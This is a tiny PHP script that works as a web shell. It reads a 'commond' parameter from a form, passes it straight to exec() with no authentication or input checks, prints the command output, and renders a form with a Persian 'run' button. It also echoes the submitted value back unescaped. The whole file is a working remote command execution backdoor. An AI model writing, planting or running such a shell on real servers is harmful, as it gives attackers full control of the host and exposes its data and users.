<?php 
//echo getcwd();
$c = "";
if(isset($_REQUEST['commond'])){
	///////////////////
	$c = $_POST['commond'];
	exec($c,$comm);
	echo "<br>RES: <br>";
	echo implode("<br>\n",$comm);
	echo "<br><br>";
}

	echo '
	<form method="post">
		<textarea colspan=20 rospan=20 name="commond" >'.$c.'</textarea>
		<input type="submit" value="اجرا" />
	</form>
	
	';